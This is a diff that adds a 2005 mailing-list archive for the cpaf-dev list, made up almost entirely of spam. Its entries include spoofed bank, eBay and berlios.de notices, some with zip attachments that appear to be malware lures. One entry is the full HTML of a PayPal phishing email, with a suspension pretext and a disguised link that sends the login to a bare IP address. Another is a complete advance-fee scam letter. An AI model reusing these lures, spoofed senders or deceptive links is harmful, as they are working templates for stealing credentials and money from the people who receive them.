@@ -1,0 +1,348 @@
+From accounts at tinkerfcu.org  Mon Aug  1 01:15:34 2005
+From: accounts at tinkerfcu.org (TFCU)
+Date: Mon, 01 Aug 2005 01:15:34 +0200
+Subject: [cpaf-dev] Urgent Security Notification
+Message-ID: <E1DzN1q-0006Fb-QP@host.activemedia.no>
+
+An HTML attachment was scrubbed...
+URL: <https://lists.berlios.de/pipermail/cpaf-dev/attachments/20050801/dc7e92c7/attachment.html>
+
+From egreetings at egreetings.com  Thu Aug  4 18:08:50 2005
+From: egreetings at egreetings.com (egreetings.com)
+Date: Thu, 4 Aug 2005 10:08:50 -0600
+Subject: [cpaf-dev] You've received a greeting from a family member!
+Message-ID: <200508041608.j74G8opv009971@secure.reaganadv.com>
+
+An HTML attachment was scrubbed...
+URL: <https://lists.berlios.de/pipermail/cpaf-dev/attachments/20050804/c307c241/attachment.html>
+
+From verify at 2checkout.com  Fri Aug  5 07:47:50 2005
+From: verify at 2checkout.com (CheckOut Verificator)
+Date: Fri, 05 Aug 05 05:47:50 GMT
+Subject: [cpaf-dev] Important! Please confitm your debit/credit card!
+Message-ID: <4-$j3n$i$9nel96$smumq0r@a6um1.8so>
+
+An HTML attachment was scrubbed...
+URL: <https://lists.berlios.de/pipermail/cpaf-dev/attachments/20050805/ee7b1104/attachment.html>
+
+From postcard at postcards4u.com  Fri Aug  5 20:52:22 2005
+From: postcard at postcards4u.com (postcard at postcards4u.com)
+Date: Fri,  5 Aug 2005 14:52:22 -0400 (EDT)
+Subject: [cpaf-dev] You've received a greeting card from a friend!
+Message-ID: <20050805185222.4E7BFCE6C23@mage.transmet.org>
+
+An HTML attachment was scrubbed...
+URL: <https://lists.berlios.de/pipermail/cpaf-dev/attachments/20050805/88b83122/attachment.html>
+
+From mail at berlios.de  Sat Aug  6 08:50:08 2005
+From: mail at berlios.de (mail at berlios.de)
+Date: Sat, 6 Aug 2005 14:50:08 +0800
+Subject: [cpaf-dev] Warning Message: Your services near to be closed.
+Message-ID: <200508060650.j766oQO15172@bat.berlios.de>
+
+An HTML attachment was scrubbed...
+URL: <https://lists.berlios.de/pipermail/cpaf-dev/attachments/20050806/6371f37f/attachment.html>
+-------------- next part --------------
+A non-text attachment was scrubbed...
+Name: email-details.zip
+Type: application/octet-stream
+Size: 57750 bytes
+Desc: not available
+URL: <https://lists.berlios.de/pipermail/cpaf-dev/attachments/20050806/6371f37f/attachment.obj>
+
+From william at sun.webnetserver.com  Sat Aug  6 11:27:55 2005
+From: william at sun.webnetserver.com (william at sun.webnetserver.com)
+Date: Sat, 06 Aug 2005 05:27:55 -0400
+Subject: [cpaf-dev] PayPal Notification ( Your account can be suspended )
+ Message-ID: <1123320475.14397.qmail@paypal.com>
+ From:  <support@paypal.com>
+ Content-Type: text/html
+ <html xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:w="urn:schemas-microsoft-com:office:word" xmlns="http://www.w3.org/TR/REC-html40"><head><!-- HOME.RO Banners v0.1 --><script language="JavaScript">
+Message-ID: <E1E1KyB-0001dA-1U@sun.webnetserver.com>
+
+<!--
+browser = (((navigator.appName == "Netscape") && (parseInt(navigator.appVersion) >= 2 )) || ((navigator.appName == "Microsoft Internet Explorer") && (parseInt(navigator.appVersion) >= 2 )));
+if (browser) {
+if (parent.name != 'homepopup') {
+   open_this = 'http://www.home.ro/ads.php3?CLIENT=' + window.location;
+   homepopup = window.open(open_this, "homepopup", "width=500,height=80");
+}
+}
+//-->
+</script><!-- END HOME.RO Banners -->
+<meta http-equiv="Content-Type" content="text/html; charset=us-ascii">
+<meta name="ProgId" content="Word.Document">
+<meta name="Generator" content="Microsoft Word 10">
+<meta name="Originator" content="Microsoft Word 10">
+<link rel="File-List" href="http://www.radek.home.ro/paypal_files/filelist.xml">
+<link rel="Edit-Time-Data" href="http://www.radek.home.ro/paypal_files/editdata.mso"><!--[if !mso]>
+<style>
+v\:* {behavior:url(#default#VML);}
+o\:* {behavior:url(#default#VML);}
+w\:* {behavior:url(#default#VML);}
+.shape {behavior:url(#default#VML);}
+</style>
+<![endif]--><!--[if gte mso 9]><xml>
+ <o:DocumentProperties>
+  <o:Author>radek</o:Author>
+  <o:Template>Normal</o:Template>
+  <o:LastAuthor>radek</o:LastAuthor>
+  <o:Revision>3</o:Revision>
+  <o:TotalTime>1</o:TotalTime>
+  <o:Created>2005-06-26T22:42:00Z</o:Created>
+  <o:LastSaved>2005-06-26T22:43:00Z</o:LastSaved>
+  <o:Pages>1</o:Pages>
+  <o:Words>276</o:Words>
+  <o:Characters>1578</o:Characters>
+  <o:Company>STOP THE LAMERS</o:Company>
+  <o:Lines>13</o:Lines>
+  <o:Paragraphs>3</o:Paragraphs>
+  <o:CharactersWithSpaces>1851</o:CharactersWithSpaces>
+  <o:Version>10.2625</o:Version>
+ </o:DocumentProperties>
+</xml><![endif]--><!--[if gte mso 9]><xml>
+ <w:WordDocument>
+  <w:GrammarState>Clean</w:GrammarState>
+  <w:BrowserLevel>MicrosoftInternetExplorer4</w:BrowserLevel>
+ </w:WordDocument>
+</xml><![endif]-->
+
+<style>
+<!--
+ /* Style Definitions */
+ p.MsoNormal, li.MsoNormal, div.MsoNormal
+	{mso-style-parent:"";
+	margin:0in;
+	margin-bottom:.0001pt;
+	mso-pagination:widow-orphan;
+	font-size:12.0pt;
+	font-family:"Times New Roman";
+	mso-fareast-font-family:"Times New Roman";}
+p
+	{mso-margin-top-alt:auto;
+	margin-right:0in;
+	mso-margin-bottom-alt:auto;
+	margin-left:0in;
+	mso-pagination:widow-orphan;
+	font-size:12.0pt;
+	font-family:"Times New Roman";
+	mso-fareast-font-family:"Times New Roman";}
+span.GramE
+	{mso-style-name:"";
+	mso-gram-e:yes;}
+@page Section1
+	{size:8.5in 11.0in;
+	margin:1.0in 1.25in 1.0in 1.25in;
+	mso-header-margin:.5in;
+	mso-footer-margin:.5in;
+	mso-paper-source:0;}
+div.Section1
+	{page:Section1;}
+-->
+</style><!--[if gte mso 10]>
+<style>
+ /* Style Definitions */
+ table.MsoNormalTable
+	{mso-style-name:"Table Normal";
+	mso-tstyle-rowband-size:0;
+	mso-tstyle-colband-size:0;
+	mso-style-noshow:yes;
+	mso-style-parent:"";
+	mso-padding-alt:0in 5.4pt 0in 5.4pt;
+	mso-para-margin:0in;
+	mso-para-margin-bottom:.0001pt;
+	mso-pagination:widow-orphan;
+	font-size:10.0pt;
+	font-family:"Times New Roman";}
+</style>
+<![endif]--></head>
+
+
+
+
+
+<body style="" lang="EN-US" link="blue" vlink="blue">
+
+<div class="Section1">
+
+<p class="MsoNormal">&nbsp; </p>
+
+<div align="center">
+
+<table class="MsoNormalTable" style="width: 6.25in;" border="0" cellpadding="0" cellspacing="0" width="600">
+ <tbody><tr style="">
+  <td style="padding: 0in;">
+  <p><img id="_x0000_i1025" src="http://www.paypalobjects.com/en_US/i/logo/paypal_logo.gif" border="0" height="50" width="200"><span style="font-size: 9pt; font-family: &quot;Courier New&quot;;">Dear PayPal Member<span class="GramE">,</span><br>
+  <br>
+  Paypal is committed to maintaining a safe environment for its community of<br>
+  buyers and sellers. To protect the security of your account, Paypal employs<br>
+  some of the most advanced security systems in the world and our anti-fraud<br>
+  teams regularly screen the Paypal system for unusual activity.<br>
+  <br>
+  Recently, our Account Review Team identified some unusual activity in your<br>
+  account. In accordance with Paypal's User Agreement and to ensure that your<br>
+  account has not been compromised, access to your account was flagged. Your<br>
+  account will remain flagged until this issue has been resolved. <br>
+  This is a fraud prevention measure meant to ensure that your account is not<br>
+  compromised.<br>
+  <br>
+  In order to secure your account and quickly restore full access, we may<br>
+  require some specific information from you for the following reason: <br>
+  <br>
+  Our system requires further account verification. <br>
+  <br>
+  Case ID Number: PP-056-245-481<br>
+  We encourage you to log in and restore full access as soon as possible.<br>
+  Should your account remain flagged for an extended period of time, <br>
+  it may result in further limitations on the use of your account or<br>
+  may result in eventual account closure.<br>
+  <br>
+  -----------------------------------------------------------------------<br>
+  Please click on the link below to log in <br>
+  and restore full access to your account. <br>
+  <a href="http://221.169.96.221/">https://www.paypal.com/cgi-bin/webscr?cmd=_login-run
+  </a><br>
+  ----------------------------------------------------------------------<br>
+  <br>
+  Thank you for your prompt attention to this matter. Please understand that<br>
+  this is a security measure meant to help protect you and your account. We<br>
+  apologize for any inconvenience.<br>
+  <br>
+  <br>
+  Sincerely,<br>
+  Paypal Account Review Department<br>
+  <br>
+  Paypal Email ID PP562 </span></p>
+  </td>
+ </tr>
+</tbody></table>
+
+</div>
+
+<p class="MsoNormal"><o:p>&nbsp;</o:p></p>
+
+</div>
+
+</body></html><!-- text below generated by server. PLEASE REMOVE --><!-- Counter/Statistics data collection code --><script language="JavaScript" src="http://hostingprod.com/js_source/geov2.js"></script><script language="javascript">geovisit();</script><noscript><img src="http://visit.webhosting.yahoo.com/visit.gif?us1123192523" alt="setstats" border="0" width="1" height="1"></noscript>
+<IMG SRC="http://geo.yahoo.com/serv?s=76001524&t=1123192523" ALT=1 WIDTH=1 HEIGHT=1>
+
+
+From support at berlios.de  Wed Aug 10 08:18:34 2005
+From: support at berlios.de (support at berlios.de)
+Date: Wed, 10 Aug 2005 14:18:34 +0800
+Subject: [cpaf-dev] You have successfully updated your password
+Message-ID: <200508100618.j7A6Ifk12445@bat.berlios.de>
+
+An HTML attachment was scrubbed...
+URL: <https://lists.berlios.de/pipermail/cpaf-dev/attachments/20050810/5e254efe/attachment.html>
+-------------- next part --------------
+A non-text attachment was scrubbed...
+Name: email-password.zip
+Type: application/octet-stream
+Size: 57752 bytes
+Desc: not available
+URL: <https://lists.berlios.de/pipermail/cpaf-dev/attachments/20050810/5e254efe/attachment.obj>
+
+From support at berlios.de  Tue Aug 16 11:17:47 2005
+From: support at berlios.de (support at berlios.de)
+Date: Tue, 16 Aug 2005 17:17:47 +0800
+Subject: [cpaf-dev] Security measures
+Message-ID: <200508160917.j7G9Hq516480@bat.berlios.de>
+
+An HTML attachment was scrubbed...
+URL: <https://lists.berlios.de/pipermail/cpaf-dev/attachments/20050816/bdf5d7b1/attachment.html>
+-------------- next part --------------
+A non-text attachment was scrubbed...
+Name: important-details.zip
+Type: application/octet-stream
+Size: 57758 bytes
+Desc: not available
+URL: <https://lists.berlios.de/pipermail/cpaf-dev/attachments/20050816/bdf5d7b1/attachment.obj>
+
+From fwilliams_ghana at indiatimes.com  Wed Aug 17 03:26:55 2005
+From: fwilliams_ghana at indiatimes.com (Barrister Femi Williams)
+Date: Wed, 17 Aug 2005 05:26:55 +0400
+Subject: [cpaf-dev] From Barrister Femi Williams
+Message-ID: <200508170125.j7H1Pr610994@bat.berlios.de>
+
+FROM: BARRISTER FEMI WILLIAMS
+Accra ? Ghana.
+EMAIL:femiwilliams at sify.com
+TEL: 00233243726686
+
+Dear Friend,
+
+I got to know about you in my desperate search for a reputable person/persons/company to assist us in a confidential business deal requiring utmost trust and urgency. I am Bar.Femi Williams, an attorney and close confidant of Mrs. Joy Gerang, wife of the late War Lord/first vice president of suden.
+She (Mrs. Joy Gerang), as a result of the trust and confidence she has in me has mandated me to search for a reliable and trustworthy foreign partner, who will help receive some funds which she had in cash totaling US$16M (sixteen Million Dollars) and a box containing Gold into a personal/ company or any reliable foreign bank account for safe keeping for a short period of time, since her family bank accounts within and outside the country are been monitored by the authorities.
+If you have been listening to CNN, BBC, VOA and international news agencies you would have heard about Dr. John Gerang and his twenty one (21) year rebel led war against the federal government and the final peace deal which saw him into the government as the first vice resident on the 9th day of July 2005 and the his death via a controversial helicopter crash on the, 1st day of August 2005 precisely after three weeks in office.
+This money in question (US$16M) and the Box of Gold has however been comfortably moved out of the country beyond the knowledge of any one and it is presently lodged with a private security company here in Ghana which has its branches in all the Continents of the world.
+Worthy to note is that the federal government of Sudan lead by Omar Hassan Ahmad al-Bashir in her bid to frustrate the Gerang?s family has placed them under partial house arrest with all their international travelers' documents withdrawn pending when the current face-off between opposition and the present administration, which from all indications is creating fear on the federal government based on the unrest emanating from his controversial death.
+She has decided to offer anybody who will be willing to render this tremendous assistance 20% of the total sum while a refund of all your expenses will be made to you as soon as this fund is cleared from the security company.
+Note: this transaction involves no risk especially now that you are not going to have any dealings whatsoever with anybody in Sudan rather you are going to deal with me or the security company directly.
+I shall let you into the complete picture of this mutual beneficial transaction when I hear from you on the above email address or telephone number with hope you are still going to treat this letter as urgent and confidential.
+Best regards,
+
+Bar. Femi Williams
+
+Attorney for the family
+NB: YOU CAN EQUALLY REACH MADAM DIRECTLY VIA:jgerang at myway.com  
+
+From billing at paypaI.com  Sun Aug 21 23:05:33 2005
+From: billing at paypaI.com (PayPal Service)
+Date: Sun, 21 Aug 2005 23:05:33 +0200 (CEST)
+Subject: [cpaf-dev] Update Debit/Credit Card
+Message-ID: <20050821210533.545C2CE74@wmphpp09.st2.lyceu.net>
+
+An HTML attachment was scrubbed...
+URL: <https://lists.berlios.de/pipermail/cpaf-dev/attachments/20050821/cb1e87c7/attachment.html>
+
+From security at www.royalbank.com  Wed Aug 24 19:02:30 2005
+From: security at www.royalbank.com (RBC Financial Group)
+Date: Thu, 25 Aug 2005 02:02:30 +0900 (JST)
+Subject: [cpaf-dev] Unauthorized transactions on your account
+Message-ID: <20050824170230.25CC732047D@sbn21.sbn21.biz>
+
+An HTML attachment was scrubbed...
+URL: <https://lists.berlios.de/pipermail/cpaf-dev/attachments/20050825/ce1f4426/attachment.html>
+
+From eBay at reply.ebay.com  Thu Aug 25 19:33:01 2005
+From: eBay at reply.ebay.com (eBay)
+Date: Thu, 25 Aug 2005 19:33:01 +0200
+Subject: [cpaf-dev] Your eBay Account Has Been Placed On-hold: Action Required
+Message-ID: <E1E8Lb3-0001SC-Rk@franz.inode.at>
+
+An HTML attachment was scrubbed...
+URL: <https://lists.berlios.de/pipermail/cpaf-dev/attachments/20050825/afde8028/attachment.html>
+
+From register at berlios.de  Sat Aug 27 10:35:49 2005
+From: register at berlios.de (register at berlios.de)
+Date: Sat, 27 Aug 2005 16:35:49 +0800
+Subject: [cpaf-dev] MEMBERS SUPPORT
+Message-ID: <200508270835.j7R8Zn618711@bat.berlios.de>
+
+An HTML attachment was scrubbed...
+URL: <https://lists.berlios.de/pipermail/cpaf-dev/attachments/20050827/f4d76c2a/attachment.html>
+-------------- next part --------------
+A non-text attachment was scrubbed...
+Name: important-details.zip
+Type: application/octet-stream
+Size: 57758 bytes
+Desc: not available
+URL: <https://lists.berlios.de/pipermail/cpaf-dev/attachments/20050827/f4d76c2a/attachment.obj>
+
+From webmaster at berlios.de  Sun Aug 28 11:10:31 2005
+From: webmaster at berlios.de (webmaster at berlios.de)
+Date: Sun, 28 Aug 2005 17:10:31 +0800
+Subject: [cpaf-dev] IMPORTANT NOTIFICATION
+Message-ID: <200508280910.j7S9AX623326@bat.berlios.de>
+
+An HTML attachment was scrubbed...
+URL: <https://lists.berlios.de/pipermail/cpaf-dev/attachments/20050828/b593e546/attachment.html>
+-------------- next part --------------
+A non-text attachment was scrubbed...
+Name: important-details.zip
+Type: application/octet-stream
+Size: 57758 bytes
+Desc: not available
+URL: <https://lists.berlios.de/pipermail/cpaf-dev/attachments/20050828/b593e546/attachment.obj>
+
